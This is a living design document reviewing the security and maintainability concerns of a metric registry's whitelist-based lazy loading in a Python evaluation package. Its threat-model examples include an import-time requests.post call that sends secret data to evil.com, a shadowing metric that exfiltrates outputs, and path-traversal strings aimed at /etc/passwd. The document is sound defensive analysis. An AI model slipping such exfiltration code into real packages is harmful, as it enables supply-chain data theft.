# Lazy Loading Implementation: Concerns Review

**Status:** Living Document
**Last Updated:** 2025-11-14
**Implementation:** `src/scorebook/metrics/metric_registry.py`
**Related:** `plan.md`

## Purpose

This document identifies, analyzes, and tracks concerns related to the lazy loading implementation for metrics in the MetricRegistry. It serves as a reference for security considerations, architectural decisions, and maintenance guidelines.

---

## Table of Contents

1. [Primary Concerns](#primary-concerns)
2. [Security Analysis](#security-analysis)
3. [Additional Concerns](#additional-concerns)
4. [Recommendations](#recommendations)
5. [Decision Log](#decision-log)

---

## Primary Concerns

### 1. Double Source of Truth

**Issue:** The implementation maintains two separate data structures that must be kept in sync:

- `_BUILT_IN_METRICS: Dict[str, str]` - Whitelist mapping metric names to module names
- `_registry: Dict[str, Type[MetricBase]]` - Runtime registry of instantiated metric classes

**Current State:**

```python
# In metric_registry.py:47-52
_registry: Dict[str, Type[MetricBase]] = {}

_BUILT_IN_METRICS: Dict[str, str] = {
    "accuracy": "accuracy",
    "precision": "precision",
}
```

**Implications:**

1. **Maintenance Burden:**
   - Adding a new metric requires two actions:
     - Adding `@MetricRegistry.register()` decorator to the metric class
     - Adding entry to `_BUILT_IN_METRICS` whitelist
   - No automated enforcement ensures both steps are completed
   - Easy to forget one step, leading to runtime errors

2. **Failure Modes:**
   - Metric in `_BUILT_IN_METRICS` but missing `@register()`:
     - Lazy load succeeds (module imports)
     - Runtime error: "Metric 'X' was loaded but failed to register" (line 135-138)
   - Metric has `@register()` but not in `_BUILT_IN_METRICS`:
     - Works if metric is eagerly imported
     - Fails if passed as string: "Metric 'X' is not a known metric" (line 127-130)

3. **Testing Impact:**
   - Tests import metrics eagerly, masking lazy loading issues
   - Test at line 96-110 validates lazy loading works for included metrics
   - No test validates that ALL decorated metrics are in whitelist

**Risk Level:** MEDIUM (Maintainability)

**Priority:** Should Address

---

### 2. Security Concerns for PyPI Package

As an open source package on PyPI, the lazy loading mechanism must be secure against various attack vectors.

#### 2.1 Arbitrary Code Execution

**Attack Vector:** Malicious user attempts to import arbitrary modules via metric names

**Example Attack:**
```python
# Attacker tries to import os module
score(items=items, metrics="os")
# Or inject malicious module path
score(items=items, metrics="../../../etc/passwd")
```

**Current Protection:**
```python
# metric_registry.py:80-81
if metric_name not in cls._BUILT_IN_METRICS:
    return False  # Validation happens BEFORE import
```

**Analysis:**
- Whitelist validation occurs before any import operation
- Invalid metrics fail fast with helpful error message
- No code path allows user input to directly control import statement

**Risk Level:** LOW (Well Protected)

**Status:** SECURE

---

#### 2.2 Path Traversal

**Attack Vector:** Attacker attempts path traversal to import modules outside intended scope

**Example Attack:**
```python
# Attempt directory traversal
score(items=items, metrics="../../malicious_module")
```

**Current Protection:**
```python
# metric_registry.py:89
importlib.import_module(f"scorebook.metrics.{module_name}")
```

**Analysis:**
- Import path is constructed with fixed prefix: `"scorebook.metrics."`
- Even if attacker manipulates `_BUILT_IN_METRICS`, the prefix prevents traversal
- Python's import system normalizes paths, preventing `..` traversal
- Whitelist validation occurs before path construction

**Risk Level:** LOW (Well Protected)

**Status:** SECURE

---

#### 2.3 Import Side Effects

**Attack Vector:** Malicious code execution via module-level side effects during import

**Example Risk:**
```python
# If accuracy.py contained:
import requests
requests.post("https://evil.com/exfiltrate", data=secret_data)  # Executes on import!

@MetricRegistry.register()
class Accuracy(MetricBase):
    ...
```

**Current Protection:** NONE

**Analysis:**
- All top-level code in a metric module executes during `importlib.import_module()`
- Built-in metrics are trusted (under scorebook's control)
- However, if a contributor adds malicious code to a metric module, it would execute
- This is a supply chain risk, not a user input risk

**Risk Level:** LOW (Trusted Source Code)

**Mitigation:**
- Code review for all metric additions
- Metrics should have minimal import-time side effects
- Consider linting rules to detect suspicious patterns

**Status:** ACCEPTABLE (Standard OSS Risk)

---

#### 2.4 Race Conditions

**Attack Vector:** Concurrent threads trigger multiple simultaneous imports of same metric

**Example Scenario:**
```python
# Thread 1 and Thread 2 simultaneously
MetricRegistry.get("accuracy")  # Both trigger lazy load
```

**Current Protection:** NONE (No threading locks)

**Analysis:**
```python
# metric_registry.py:122-130
if key not in cls._registry:
    # RACE CONDITION: Multiple threads could enter here
    if not cls._lazy_load_metric(key):
        raise ValueError(...)
```

**Behavior:**
- Python's GIL provides partial protection for dict operations
- `importlib.import_module()` is thread-safe (Python caches modules)
- However, decorator could run multiple times:
  ```python
  # register() at line 69-70
  if key in cls._registry:
      raise ValueError(f"Metric '{key}' is already registered")
  ```
- Race condition could cause ValueError: "Metric 'accuracy' is already registered"

**Risk Level:** LOW-MEDIUM (Functionality, not Security)

**Impact:**
- Security: None (no data corruption or unauthorized access)
- Reliability: Possible intermittent failures in multi-threaded apps
- Frequency: Rare (only during first lazy load of a metric)

**Status:** KNOWN ISSUE

---

#### 2.5 Registry Manipulation

**Attack Vector:** External code directly modifies `_registry` or `_BUILT_IN_METRICS`

**Example Attack:**
```python
# Attacker clears registry
MetricRegistry._registry.clear()

# Attacker injects malicious metric
MetricRegistry._BUILT_IN_METRICS["evil"] = "evil_module"
```

**Current Protection:** NONE (Class variables are public)

**Analysis:**
- Python convention: `_` prefix indicates "internal, do not use"
- No enforcement mechanism (Python doesn't have true private members)
- If attacker has code execution, they can modify anything
- This is not unique to the lazy loading implementation

**Risk Level:** LOW (Requires Code Execution)

**Rationale:**
- If attacker can run Python code in the process, game is over anyway
- Standard Python security model doesn't prevent this
- Acceptable risk for Python library

**Status:** BY DESIGN (Python Convention)

---

#### 2.6 Custom Metrics vs Built-in Metrics

**Issue:** Inconsistent behavior between built-in and custom metrics

**Current Behavior:**

```python
# Built-in metric: Can use string name
score(items=items, metrics="accuracy")  # ✓ Works via lazy loading

# Custom metric: CANNOT use string name
@MetricRegistry.register()
class CustomMetric(MetricBase):
    ...

score(items=items, metrics="custommetric")  # ✗ ValueError: not a known metric
score(items=items, metrics=CustomMetric)    # ✓ Works (pass class directly)
```

**Analysis:**
- Custom metrics not in `_BUILT_IN_METRICS` cannot be lazy-loaded
- Users must explicitly import custom metrics before using them
- This breaks the convenience promise of "pass metrics as strings"

**Risk Level:** NONE (Security), MEDIUM (Usability)

**Impact:**
- Users confused why custom metrics require different usage pattern
- Documentation must explain this limitation
- May lead to feature requests for custom metric whitelist

**Status:** KNOWN LIMITATION

---

#### 2.7 Dependency Confusion

**Attack Vector:** Malicious package with similar name to metric module dependency

**Example Scenario:**
```python
# If accuracy.py imports:
from sklearn import metrics  # Legitimate

# Attacker publishes malicious "sklearn" package to PyPI
# If user doesn't have sklearn installed, pip might install malicious version
```

**Current Protection:** Standard dependency management

**Analysis:**
- This is a supply chain attack, not specific to lazy loading
- Standard Python/pip security considerations apply
- Metrics should not have external dependencies if possible

**Risk Level:** LOW-MEDIUM (Standard Supply Chain Risk)

**Mitigation:**
- Pin dependencies in `pyproject.toml`
- Use `requirements.txt` with hashes for reproducible builds
- Regular dependency audits (`pip-audit`, Dependabot)
- Minimize metric dependencies

**Status:** STANDARD OSS PRACTICE

---

#### 2.8 Name Collision / Typosquatting

**Attack Vector:** Malicious user creates metric with name that shadows built-in metric

**Example Attack:**
```python
# Attacker creates malicious metric
@MetricRegistry.register()
class Accuracy(MetricBase):  # Same name as built-in
    def score(self, outputs, labels):
        exfiltrate_data(outputs, labels)  # Malicious
        return {"accuracy": 1.0}, [True] * len(outputs)

# If this runs before built-in accuracy is loaded...
score(items=items, metrics="accuracy")  # Uses malicious version!
```

**Current Protection:**

```python
# metric_registry.py:69-70
if key in cls._registry:
    raise ValueError(f"Metric '{key}' is already registered")
```

**Analysis:**
- First metric to register wins
- Subsequent attempts to register same name raise ValueError
- Built-in metrics NOT pre-registered (only loaded on demand)
- If attacker's code runs before lazy load, they win

**Risk Level:** LOW (Requires Code Execution)

**Rationale:**
- If attacker can execute arbitrary Python in the process, they have many easier attack vectors
- This is not unique to the registry pattern
- Standard Python security model

**Status:** ACCEPTABLE RISK

---

## Additional Concerns

### 3. Maintainability and Developer Experience

#### 3.1 Adding New Metrics

**Current Process:**
1. Create metric class file in `src/scorebook/metrics/`
2. Add `@MetricRegistry.register()` decorator
3. Add entry to `_BUILT_IN_METRICS` in `metric_registry.py`
4. Write tests
5. Update documentation

**Issues:**
- Step 3 is easy to forget (not automated)
- No validation that steps 2 and 3 are both completed
- CI/CD doesn't catch missing whitelist entry if tests eagerly import metrics

**Recommendations:**
- Add automated validation in CI
- Consider auto-discovery mechanism (see Section 4.1)

---

#### 3.2 Error Messages

**Current State:**

Good error messages:
```python
# metric_registry.py:127-130
raise ValueError(
    f"Metric '{name_or_class}' is not a known metric. "
    f"Available metrics: {available_metrics}"
)
```

Missing improvements:
- No "did you mean?" suggestions for typos
  - User types `"acuracy"` → Could suggest `"accuracy"`
- ImportError context could be clearer
  - Current: Shows full exception chain
  - Could: Add troubleshooting hints

**Risk Level:** NONE (Quality of Life)

---

#### 3.3 Discoverability

**Issue:** `list_metrics()` only shows registered metrics, not available metrics

```python
# Before any lazy loading
MetricRegistry.list_metrics()  # Returns: []

# After first use
score(items=items, metrics="accuracy")
MetricRegistry.list_metrics()  # Returns: ["accuracy"]

# BUT, precision is also available!
```

**Current Behavior:** Line 147-155
```python
@classmethod
def list_metrics(cls) -> List[str]:
    """List all registered metrics."""
    return list(cls._registry.keys())
```

**User Expectation:** See all available metrics, not just loaded ones

**Solution:** Return `_BUILT_IN_METRICS.keys()` or union of both

---

#### 3.4 Testing Challenges

**Issues:**

1. **Registry State Pollution:**
   - Tests import metrics, populating `_registry`
   - Subsequent tests see pre-populated registry
   - Hard to test "fresh" lazy loading behavior
   - Test at line 143-157 checks that re-requesting doesn't re-import

2. **No Concurrency Tests:**
   - No tests for race conditions (Section 2.4)
   - Difficult to reproduce in test environment

3. **No Validation Tests:**
   - No test ensures all `_BUILT_IN_METRICS` entries are valid
   - No test ensures all `@register()` metrics are in whitelist

**Current State:** Tests cover happy path and basic error cases, but not edge cases

---

### 4. Architectural Concerns

#### 4.1 Extensibility

**Issue:** No mechanism for users to add custom metrics to the whitelist

**User Request (Hypothetical):**
```python
# User wants to register custom metric for string-based access
MetricRegistry.register_custom_metric("my_metric", "my_package.my_metric")

# Then use it like built-in metrics
score(items=items, metrics="my_metric")  # Should work
```

**Current Limitation:** Not possible without modifying `_BUILT_IN_METRICS`

**Potential Solutions:**
1. `MetricRegistry.add_to_whitelist(name, module_path)` method
2. Environment variable: `SCOREBOOK_CUSTOM_METRICS="my_metric:my_package.my_metric"`
3. Config file: `~/.scorebook/custom_metrics.json`
4. Auto-discovery: Scan entry points or specific directory

**Trade-offs:**
- Flexibility vs. Security (larger attack surface)
- Simplicity vs. Power (more complex API)

---

#### 4.2 Performance

**Current Implementation:**

```python
# metric_registry.py:122-130
if key not in cls._registry:
    if not cls._lazy_load_metric(key):
        raise ValueError(...)
```

**Performance Characteristics:**
- First access: O(1) dict lookup + O(import) module import
- Subsequent access: O(1) dict lookup only
- Import time for metrics: Minimal (simple classes)

**Concern:** Import time adds latency to first metric usage

**Measurements Needed:**
- Benchmark import time for each metric
- Measure impact on `score()` cold start

**Status:** Likely not a concern, but unmeasured

---

#### 4.3 Circular Import Risk

**Current State:**

```python
# metric_registry.py imports:
from scorebook.metrics.core.metric_base import MetricBase

# accuracy.py imports:
from scorebook.metrics.core.metric_registry import MetricRegistry
```

**Analysis:**
- Currently safe: Registry doesn't import metrics directly
- Lazy loading breaks potential circular import
- Risk: If someone adds metric import to registry, circular import occurs

**Prevention:**
- Maintain current structure (registry doesn't import metrics)
- Lazy loading is the solution, not the problem

---

## Recommendations

### Priority 1: Address Double Source of Truth

**Options:**

**Option A: Automated Validation (Recommended)**
```python
# Add to metric_registry.py or separate validation script
def validate_metrics_consistency():
    """Ensure all built-in metrics are properly registered."""
    errors = []

    for metric_name, module_name in _BUILT_IN_METRICS.items():
        # Try to import
        try:
            importlib.import_module(f"scorebook.metrics.{module_name}")
        except ImportError as e:
            errors.append(f"Metric '{metric_name}' in whitelist but module doesn't exist: {e}")
            continue

        # Check it's in registry
        if metric_name not in _registry:
            errors.append(f"Metric '{metric_name}' in whitelist but not registered (missing @register decorator?)")

    # Check for registered metrics not in whitelist
    for registered_name in _registry:
        if registered_name not in _BUILT_IN_METRICS:
            errors.append(f"Metric '{registered_name}' is registered but not in whitelist")

    if errors:
        raise ValueError("Metric registry inconsistency:\n" + "\n".join(errors))
```

Add to CI/CD:
```yaml
# In GitHub Actions or similar
- name: Validate metrics registry
  run: python -m scorebook.metrics.validate_metrics
```

**Option B: Auto-Discovery (More Complex)**
- Scan `src/scorebook/metrics/` for `@register` decorated classes
- Automatically build `_BUILT_IN_METRICS` from discovered metrics
- Trade-off: More magic, less explicit control

**Recommendation:** Start with Option A (validation), consider Option B later

---

### Priority 2: Improve Documentation

**Add to README or docs:**

1. **Security Model:**
   ```markdown
   ## Security: Lazy Loading and Metric Registry

   Scorebook uses a whitelist-based lazy loading system for metrics. When you pass
   a metric name as a string, it's validated against a predefined list before import.
   This prevents arbitrary code execution from user input.

   Only built-in metrics can be referenced by string. Custom metrics must be passed
   as classes or instances.
   ```

2. **Custom Metrics:**
   ```markdown
   ## Registering Custom Metrics

   To create a custom metric:

   1. Extend MetricBase and add the @register decorator:
      ```python
      from scorebook.metrics import MetricBase, MetricRegistry

      @MetricRegistry.register()
      class MyMetric(MetricBase):
          def score(self, outputs, labels):
              ...
      ```

   2. Pass your metric as a class (not string):
      ```python
      score(items=items, metrics=MyMetric)  # ✓ Correct
      score(items=items, metrics="mymetric")  # ✗ Won't work (not in whitelist)
      ```
   ```

3. **Developer Guide:**
   ```markdown
   ## Adding New Built-in Metrics

   To add a new metric to scorebook:

   1. Create `src/scorebook/metrics/your_metric.py`
   2. Add `@MetricRegistry.register()` decorator
   3. Add entry to `_BUILT_IN_METRICS` in `metric_registry.py`
   4. Write tests in `tests/test_metrics/`
   5. Run validation: `python -m scorebook.metrics.validate_metrics`
   ```

---

### Priority 3: Testing Improvements

**Add Tests:**

1. **Validation Test:**
   ```python
   def test_metrics_consistency():
       """Ensure all built-in metrics are properly registered and loadable."""
       for metric_name in MetricRegistry._BUILT_IN_METRICS:
           # Should load without error
           metric = MetricRegistry.get(metric_name)
           assert metric.name == metric_name
   ```

2. **Whitelist Coverage Test:**
   ```python
   def test_all_registered_metrics_in_whitelist():
       """Ensure we don't forget to add metrics to whitelist."""
       # Load all metrics
       for metric_name in MetricRegistry._BUILT_IN_METRICS:
           MetricRegistry.get(metric_name)

       # Check all registered metrics are in whitelist
       for registered in MetricRegistry.list_metrics():
           assert registered in MetricRegistry._BUILT_IN_METRICS, \
               f"Metric '{registered}' is registered but not in whitelist"
   ```

3. **Import Error Test:**
   ```python
   def test_lazy_load_import_error():
       """Test helpful error when metric module has import error."""
       # Temporarily add broken metric to whitelist
       original = MetricRegistry._BUILT_IN_METRICS.copy()
       try:
           MetricRegistry._BUILT_IN_METRICS["broken"] = "nonexistent_module"
           with pytest.raises(ImportError) as exc_info:
               MetricRegistry.get("broken")
           assert "Failed to load metric 'broken'" in str(exc_info.value)
       finally:
           MetricRegistry._BUILT_IN_METRICS = original
   ```

---

### Priority 4: Quality of Life Improvements

**1. Improve `list_metrics()` to show all available metrics:**

```python
@classmethod
def list_metrics(cls, include_available: bool = True) -> List[str]:
    """List all metrics.

    Args:
        include_available: If True, include all built-in metrics (even if not loaded).
                          If False, only show currently registered metrics.

    Returns:
        List of metric names.
    """
    if include_available:
        # Return union of registered and available
        return sorted(set(cls._registry.keys()) | set(cls._BUILT_IN_METRICS.keys()))
    else:
        return list(cls._registry.keys())
```

**2. Add "did you mean?" suggestions:**

```python
# Use difflib for fuzzy matching
import difflib

# In get() method, if metric not found:
if not cls._lazy_load_metric(key):
    available = sorted(cls._BUILT_IN_METRICS.keys())
    suggestions = difflib.get_close_matches(key, available, n=3, cutoff=0.6)
    error_msg = f"Metric '{name_or_class}' is not a known metric."
    if suggestions:
        error_msg += f" Did you mean: {', '.join(suggestions)}?"
    error_msg += f" Available metrics: {', '.join(available)}"
    raise ValueError(error_msg)
```

---

### Priority 5: Consider Future Enhancements

**1. Custom Metric Whitelist Extension (Future):**

```python
@classmethod
def register_custom_metric_path(cls, name: str, module_path: str) -> None:
    """Allow users to add custom metrics to the whitelist.

    This enables string-based access for custom metrics outside scorebook.

    Security Warning:
        Only add trusted module paths. The module will be imported when requested.

    Args:
        name: Metric name (will be lowercase)
        module_path: Full Python module path (e.g., "my_package.my_metric")
    """
    key = name.lower()
    if key in cls._BUILT_IN_METRICS:
        raise ValueError(f"Cannot override built-in metric '{key}'")

    # Store in separate dict to distinguish from built-in
    if not hasattr(cls, '_custom_metrics'):
        cls._custom_metrics = {}
    cls._custom_metrics[key] = module_path
```

**2. Metric Caching/Preloading (Future):**

```python
@classmethod
def preload_all_metrics(cls) -> None:
    """Load all built-in metrics into the registry.

    Useful for avoiding lazy load latency in production or for debugging.
    """
    for metric_name in cls._BUILT_IN_METRICS:
        cls.get(metric_name)
```

---

## Decision Log

### 2025-11-14: Initial Implementation

**Decision:** Use whitelist-based lazy loading with `_BUILT_IN_METRICS`

**Rationale:**
- Security: Prevents arbitrary code execution
- Simplicity: Easy to understand and maintain
- Explicitness: Clear which metrics are available

**Trade-offs Accepted:**
- Maintenance burden of two data structures
- Custom metrics cannot use string names
- Potential for inconsistency

**Alternatives Considered:**
1. **Import all metrics in `__init__.py`:** Rejected due to import cost
2. **Auto-discovery via directory scan:** Rejected for security and explicitness
3. **No lazy loading, require explicit imports:** Rejected for poor UX

---

### Future: [Date] - [Decision Title]

[Template for future decisions]

---

## Appendix: Code References

**Key Files:**
- Implementation: `src/scorebook/metrics/metric_registry.py`
- Usage: `src/scorebook/score/score_helpers.py:49` (resolve_metrics)
- Usage: `src/scorebook/eval_datasets/eval_dataset.py:667` (_resolve_metrics)
- Tests: `tests/test_metrics/test_metric_registry.py`
- Plan: `plan.md`

**Key Code Sections:**
- Whitelist: `metric_registry.py:49-52`
- Lazy loading: `metric_registry.py:77-95`
- Validation: `metric_registry.py:122-130`
- Registration: `metric_registry.py:54-74`

---

## Status Summary

| Concern | Risk Level | Status | Action Required |
|---------|-----------|--------|----------------|
| Double source of truth | MEDIUM (Maintainability) | Known | Add validation (P1) |
| Arbitrary code execution | LOW | SECURE | None |
| Path traversal | LOW | SECURE | None |
| Import side effects | LOW | ACCEPTABLE | Code review for new metrics |
| Race conditions | LOW-MEDIUM | KNOWN ISSUE | Consider threading locks (P4) |
| Registry manipulation | LOW | BY DESIGN | Document Python conventions |
| Custom metric inconsistency | MEDIUM (UX) | KNOWN LIMITATION | Document clearly (P2) |
| Dependency confusion | LOW-MEDIUM | STANDARD RISK | Follow OSS best practices |
| Name collision | LOW | ACCEPTABLE | None |
| Discoverability | NONE (QoL) | Enhancement | Improve list_metrics() (P4) |
| Error messages | NONE (QoL) | Enhancement | Add suggestions (P4) |
| Testing gaps | MEDIUM | To Do | Add validation tests (P3) |
| Documentation gaps | MEDIUM | To Do | Add security docs (P2) |
| Extensibility | LOW | Future | Consider custom whitelist API |

---

## Next Steps

1. Implement automated validation (Priority 1)
2. Add documentation sections (Priority 2)
3. Add recommended tests (Priority 3)
4. Consider quality of life improvements (Priority 4)
5. Monitor for issues in the wild
6. Revisit custom metric extensibility based on user requests

---

**Document Maintenance:**
- Review after each metric addition
- Update after security audit
- Revise when implementation changes
- Add entries to Decision Log for major choices
